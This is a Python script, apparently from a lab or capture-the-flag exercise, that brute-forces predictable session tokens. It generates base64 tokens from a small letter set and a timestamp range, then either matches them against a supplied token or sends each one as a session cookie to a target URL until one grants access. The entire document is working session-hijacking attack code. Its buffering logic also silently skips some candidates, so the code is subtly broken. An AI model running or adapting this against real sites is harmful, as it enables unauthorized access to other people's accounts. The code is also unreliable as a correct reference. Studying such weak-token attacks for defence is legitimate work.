import base64
import sys

#the UTC stamp span within the valid tokens was created
r1 = range(1678979619,1678979641)

def search(v):
    valid_token = sys.argv[1] #read the token to search
    for x in r1: #this is the part of the token's range between our 2 valid tokens
        current_token = ''.join(v) + str(x)
        tkb64 = base64.b64encode(current_token.encode('ascii')).decode('ascii')
        #print(valid_token + ":" + tkb64)
        if tkb64 == valid_token:
            print("Found " + tkb64)
###################################################################################################

def access(v):
    import requests
    url = sys.argv[1] #read the URL to access
    for x in r1: #this is the part of the token's range between our 2 valid tokens
        current_token = ''.join(v) + str(x)
        tkb64 = base64.b64encode(current_token.encode('ascii')).decode('ascii')
        ck={'__SESSION_ID__':tkb64}
        resp = requests.get(url,cookies=ck)
        if resp.ok:
            print("Valid token to access is: " + tkb64)
######################################################################################################

if __name__ == '__main__':

    from itertools import product
    from multiprocessing import Pool

    cpus = 8 #adjust this value considering yours available CPU. You can get the number as follows: multiprocessing.cpu_count()
    
    pool = Pool(cpus)
    # 100 is buffer size multiplier - the number of itmems that each process will get
    buff_size = 100 * cpus  
    buff = []

    #These are the random letters  used to create the alphabetical part of the token
    letters = ['l', 'y', 'e', 'm', 'a']

    #This is the length of the alphabetical part of the token
    alph_tok_len = 10
    
    
    if len(sys.argv) != 2:
        print("You can pass a b64 encoded token to test, e.g. " + sys.argv[0] + " bHllYWVsbXl5bTE2Nzg5NzkwODI=")
        print("Or you can try to get access to the URL that you pass, e.g. " + sys.argv[0] + " https://site_2.test/auth_resource")
    else:
        # Using the itertools.product we can get all the possible combinations between the letters, in a repeatition of 10.
        for i, r in enumerate(product(letters, repeat = alph_tok_len)):
            if (i % buff_size) == (buff_size-1):
                if sys.argv[1].startswith("http"):
                    pool.map(access, buff)
                else:
                    pool.map(search, buff)
                buff = []
            else:
                buff.append(r)

        if len(buff) > 0:
            if sys.argv[1].startswith("http"):
                pool.map(access, buff)
            else:
                pool.map(search, buff)
            buff = []
            